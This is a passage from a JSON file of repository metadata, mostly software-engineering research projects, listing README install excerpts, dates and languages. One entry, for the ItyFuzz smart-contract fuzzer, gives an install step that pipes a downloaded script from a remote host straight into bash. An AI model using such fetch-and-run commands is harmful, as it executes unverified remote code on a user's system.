                    "value": "To reproduce the figures and tables included in our paper, simply execute the corresponding scripts in the `scripts/` directory.\nThey also provide formal documentation about the specific data analysis that we did:\n\n```\ncd scripts\n./create-figure-distribution-unsafe-types.py\n./create-figure-unsafe-import-depth.py\n./create-table-dataset-labels.py\n./create-table-dataset-projects.py\n```\n\nFigures are saved as PDF files in the same directory, tables are written to the terminal as LaTeX code.\n\nTo execute the scripts, you need the following Python libraries:\n\n - Pandas\n - Numpy\n - Matplotlib\n - Tikzplotlib\n - Seaborn\n\n",
                    "type": "Text_excerpt",
                    "original_header": "How to reproduce figures and tables",
                    "parent_header": [
                        "Data Set: Finding Unsafe Go Code in the Wild"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            },
            {
                "result": {
                    "value": "To reproduce the data set, first obtain the raw project code and dependencies. The easiest way to do this is to get the\ncompressed archive with the exact project code that we used from our Zenodo record:\n[https://zenodo.org/record/4001728](https://zenodo.org/record/4001728)\n\nAlternatively, you can recursively clone this repository to check out the projects data set submodules. The projects\nare included as submodules at the correct revision that we used for analysis in this repository. They are located in\nthe `projects/` directory. After recursively cloning the repositories, you may need to run `go mod vendor` in the root\ndirectory of each repository to make sure that all dependencies are properly downloaded. This step is unnecessary when\nusing the Zenodo record.\n\nThen, build and execute the data acquisition tool in the `scripts/data-acquisition-tool` directory. The folder contains\na README file with the build instructions and usage information.\n\n",
                    "type": "Text_excerpt",
                    "original_header": "How to reproduce the data set",
                    "parent_header": [
                        "Data Set: Finding Unsafe Go Code in the Wild"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/stg-tud/unsafe_go_study_results/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-23T08:25:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-02-23T15:43:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 99577
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 46254
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 11358
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "739": {
        "filename": "evidencebp_comsum_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/evidencebp/comsum",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Live version is updating at https://github.com/evidencebp/comsum/ \n",
                    "original_header": "Versions"
                },
                "confidence": 0.9994295067386849,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/evidencebp/comsum/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-10T16:29:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-10-14T08:53:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 42739
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2445
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "740": {
        "filename": "zorazrw_odex_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/zorazrw/odex",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```bash\npip install -r requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "Execution-based Evaluation for Open Domain Code Generation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/zorazrw/odex/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "[cc-by-sa]: http://creativecommons.org/licenses/by-sa/4.0/\n[cc-by-sa-image]: https://licensebuttons.net/l/by-sa/4.0/88x31.png\n[cc-by-sa-shield]: https://img.shields.io/badge/License-CC%20BY--SA%204.0-lightgrey.svg \n",
                    "original_header": "Execution-based Evaluation for Open Domain Code Generation"
                },
                "confidence": 0.9913883948134029,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zorazrw/odex/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To correctly execute the (canonical) code snippets, one needs to install all involved libraries, as listed in the `./library/` directory. \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9994087144541614,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zorazrw/odex/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For __CodeX__, run\n```bash\npython nl2code_codex.py --language en \\\n--model_name \"code-davinci-002\" \\\n--openai_api_key ${YOUR_API_KEY} \\\n```\n \nFor __CodeGen__, run\n```bash\npython nl2code_codegen.py --language en \\\n--model_size 350M --model_data mono \n```\n \n",
                    "original_header": "Evaluating Code Generation Models"
                },
                "confidence": 0.9289423647146491,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zorazrw/odex/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Our default evaluation metric is the execution pass rate.\nBefore the evaluation, make sure your environment has all required libraries installed, and better imported as in the code samples. To do this, you can:\n```bash\npip install -r ./library/requirements.txt \npython ./library/imports.py\n```\nThen we can perform the execution by running:\n```bash\npython eval_passk.py --language en --prediction_path ${MODEL_PRED_PATH}\n```\nWe also support five other non-execution metrics: BLEU, ROUGE, METEOR, ChrF, and CodeBLEU.\nFor example, to evaluate with the BLEU metric, run:\n```bash\npython eval_nonex.py --language en --prediction_path ${MODEL_PRED_PATH} --eval_metric bleu\n```\n \n",
                    "original_header": "Evaluation"
                },
                "confidence": 0.9999999999195666,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/zorazrw/odex/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-20T16:36:41Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-05T12:36:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 218295
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 24365
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "741": {
        "filename": "ASE-REEF_REEF-data_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ASE-REEF/REEF-data",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-08-15T15:04:19Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-25T10:11:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "742": {
        "filename": "francescosecci_Python_Image_Failures_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/francescosecci/Python_Image_Failures",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "For the conversion from 'PIL.JpegImagePlugin.JpegImageFile' (or 'PIL.Image.Image') to 'numpy.ndarray' you can use the command:\n```python\nimg1 = np.array(picture) # now img1 is a <class 'numpy.ndarray'> object\n``` \n",
                    "original_header": "Few things about the code used"
                },
                "confidence": 0.9851075583670256,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/francescosecci/Python_Image_Failures/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-03-23T11:38:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-06T05:19:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 26980
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "743": {
        "filename": "empear-analytics_code-health-study-tech-debt-2022_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/empear-analytics/code-health-study-tech-debt-2022",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-01-16T16:38:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-09-03T21:09:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 372124
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "744": {
        "filename": "shrivastavadisha_N-PEPS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/shrivastavadisha/N-PEPS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "`python -m scripts.gen_train_programs --num_train=100000 --train_output_path=data/E1/trainval_dataset --max_train_len=4`",
                    "type": "Text_excerpt",
                    "original_header": "Setting E1: Train programs up to length 4 and test programs of length = 4",
                    "parent_header": [
                        "Data",
                        "Generating training and validation programs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shrivastavadisha/N-PEPS/master/README.md"
            },
            {
                "result": {
                    "value": "`python -m scripts.gen_train_programs --num_train=100000 --train_output_path=data/E2/trainval_dataset --max_train_len=12`\n\nThe training and validation datasets for training the GPS model are stored as train_dataset_gps and val_dataset_gps, and the corresponding datasets for training the PE model as train_dataset_pe and val_dataset_pe, respectively. Note that since the generation process is random, the generated programs and examples may differ each time the script is run.\n",
                    "type": "Text_excerpt",
                    "original_header": "Setting E2: Train programs up to length 12 and test programs of length = 5, 8, 10, 12, 14",
                    "parent_header": [
                        "Data",
                        "Generating training and validation programs"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/shrivastavadisha/N-PEPS/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* We have build upon PCCoder implementation available at https://github.com/amitz25/PCCoder (MIT License)\n \n",
                    "original_header": "Notes"
                },
                "confidence": 0.9996914880181138,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/shrivastavadisha/N-PEPS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-06-06T05:47:02Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-10T04:15:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 151019
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "745": {
        "filename": "Alex-HaochenLi_RACS_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Alex-HaochenLi/RACS",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\nconda create -n RACS python=3.6 -y\nconda activate RACS\nconda install pytorch-gpu=1.7.1 -y\npip install transformers==4.18.0 scikit-learn nltk==3.6.1 tensorboardX tqdm more_itertools pytrec_eval elasticsearch tree_sitter\nconda install faiss-cpu -c pytorch\n```\n \n",
                    "original_header": "Environment"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Alex-HaochenLi/RACS/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-17T04:04:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-30T02:14:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 128117
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 430
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "746": {
        "filename": "ika-rwth-aachen_robotkube_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ika-rwth-aachen/robotkube",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2023-05-23T05:49:05Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-27T16:08:15Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 14026
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1569
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "747": {
        "filename": "Yuanyuan-Yuan_NeuraL-Coverage_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Yuanyuan-Yuan/NeuraL-Coverage",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "- Build from source code\n\n    ```setup\n    git clone https://github.com/Yuanyuan-Yuan/NeuraL-Coverage\n    cd NeuraL-Coverage\n    pip install -r requirements.txt\n    ```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "NeuraL-Coverage"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Yuanyuan-Yuan/NeuraL-Coverage/main/README.md"
            },
            {
                "result": {
                    "value": "```bash\npython fuzz.py --dataset CIFAR10 --model resnet50 --criterion NC\n```\n\nFor random mutation (i.e., without any criterion as objective), run\n\n```bash\npython fuzz_rand.py --dataset CIFAR10 --model resnet50\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Guiding Input Mutation in DNN Testing",
                    "parent_header": [
                        "NeuraL-Coverage",
                        "Experiments"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/Yuanyuan-Yuan/NeuraL-Coverage/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Since we directly insert the BigGAN project path into system path, passing arguments to `eval_diversity_gen.py` in bash has conflicts with BigGAN projects. Therefore, we recommend first setting the following arguments in `eval_diversity_gen.py` and then run `python eval_diversity_gen.py`. \n",
                    "original_header": "Generative Model"
                },
                "confidence": 0.9997490831294046,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/Yuanyuan-Yuan/NeuraL-Coverage/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-12-12T14:16:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-18T09:24:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 721805
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 14119
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "MATLAB",
                    "name": "MATLAB",
                    "type": "Programming_language",
                    "size": 11868
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "748": {
        "filename": "ananevans_icse2020_2024-10-04.json",
        "code_repository": "No code repository found.",
        "installation_instructions": "No installation instructions found.",
        "date_created": "No date_created found.",
        "date_updated": "No date_updated found.",
        "programming_languages": "No programming languages found."
    },
    "749": {
        "filename": "JUnitContest_JUGE_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/JUnitContest/JUGE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Here you will find the source code to the JUGE and instructions on how to test your tool with the infrastructure.  \n",
                    "original_header": "JUnit Generation Benchmarking Infrastructure (JUGE)"
                },
                "confidence": 0.9941261545839966,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/JUnitContest/JUGE/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-10-11T08:45:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-26T12:08:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 244085
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16443
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 8551
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 2375
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1436
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "750": {
        "filename": "WenJinfeng_Serverless_Survey_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WenJinfeng/Serverless_Survey",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-12-05T14:16:36Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-24T14:58:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "751": {
        "filename": "bommarito-consulting_pypi-research-data_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/licensio/pypi-research-data",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2019-07-22T14:02:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2022-05-16T17:49:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 74232
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "752": {
        "filename": "mrezende_concra_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mrezende/concra",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2020-04-10T17:35:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-21T09:58:18Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 39099551
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 243520
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "753": {
        "filename": "fuzzland_ityfuzz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/fuzzland/ityfuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "```\ncurl -L https://ity.fuzz.land/ | bash\nityfuzzup\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Install",
                    "parent_header": [
                        "\ud83c\udf66 ItyFuzz"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/fuzzland/ityfuzz/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p align=\"middle\">\n    <img src=\"https://ityfuzz.assets.fuzz.land/daedaluzz-bar.jpeg\" width=\"49%\">\n    <img src=\"https://ityfuzz.assets.fuzz.land/FvRIuhfWwAEdBBz.jpg\" width=\"49%\">\n</p>\n \n",
                    "original_header": "Performance"
                },
                "confidence": 0.9674118989224696,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/fuzzland/ityfuzz/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-10-25T00:09:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T14:41:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rust",
                    "name": "Rust",
                    "type": "Programming_language",
                    "size": 1598548
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Solidity",
                    "name": "Solidity",
                    "type": "Programming_language",
                    "size": 78805
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 29050
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 12420
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Move",
                    "name": "Move",
                    "type": "Programming_language",
                    "size": 7800
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Handlebars",
                    "name": "Handlebars",
                    "type": "Programming_language",
                    "size": 4417
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 1513
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1284
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 427
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "RenderScript",
                    "name": "RenderScript",
                    "type": "Programming_language",
                    "size": 1
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "754": {
        "filename": "luckyPer_PTSG_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/luckyPer/PBACE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-08-21T13:39:56Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-03-05T06:30:54Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 108939
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "755": {
        "filename": "pdlan_OSCAR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/pdlan/OSCAR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run following commands to build a docker image for the environment:\n```shell\ncd docker\nsudo docker build -t oscar:latest .\n```\nAnd you can launch a container with `nvidia-docker` command.\n```shell\nsudo nvidia-docker run -it --shm-size=100g --mount type=bind,source=\"$(pwd)\",target=/oscar oscar:latest\n```\nTo compile the binaries for processing the data:\n```shell\ncd /oscar/bin\nmake\n```\n \n",
                    "original_header": "Environment"
                },
                "confidence": 0.9999999999994316,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/pdlan/OSCAR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-05-10T06:05:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-08-16T04:27:08Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1139191
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1022753
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 25791
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 20745
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Go",
                    "name": "Go",
                    "type": "Programming_language",
                    "size": 10563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1503
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 645
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 216
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "756": {
        "filename": "DeepSoftwareAnalytics_RACE_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/DeepSoftwareAnalytics/RACE",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\nconda create -n RACE python=3.6 -y\nconda activate RACE\npip install torch==1.10 transformers==4.12.5 tqdm==4.64.1 prettytable==2.5.0 gdown==4.5.1 more-itertools==8.14.0 tensorboardX==2.5.1 setuptools==59.5.0  tensorboard== 2.10.1\n``` \n",
                    "original_header": "Environment"
                },
                "confidence": 0.9999999999881481,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/DeepSoftwareAnalytics/RACE/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
